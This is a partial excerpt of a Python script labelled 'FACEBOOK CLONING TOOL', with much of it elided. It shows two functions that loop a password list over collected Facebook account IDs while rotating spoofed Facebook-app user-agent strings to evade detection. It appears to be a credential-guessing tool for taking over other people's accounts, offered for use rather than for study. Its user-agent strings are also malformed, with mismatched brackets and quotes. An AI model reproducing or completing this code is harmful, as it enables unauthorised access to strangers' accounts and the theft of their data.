...
print(" \033[1;32mFACEBOOK CLONING TOOL ")
time.sleep(2.0)
...
def ffb(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/124.0.0.69.50;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_PH;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X6810;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/80.0.0.69.75;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_PH;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X671;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/MessengerLite;FBAV/91.0.0.58.84;FBPN/com.facebook.mlite;FBLC/en_PH;FBBV/346850586;FBCR/TNT;FBMF/INFINIX MOBILTY LIMITED;FBBD/Infinix ;FBDV/Infinix X6811;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.0,width=720,height=1472};]','[FBAN/Orca-Android;FBAV/144.0.0.74.148;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/396116327;FBCR/TNT;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix X559;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]"
...
def ffb1(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/378.0.0.55.159;[FBAN/Orca-Android;FBAV/357.0.0.57.41;FBPN/com.facebook.orca;FBLC/en_PH;FBBV/396116327;FBCR/TNT;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix X620;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1444};FB_FW/1;]"
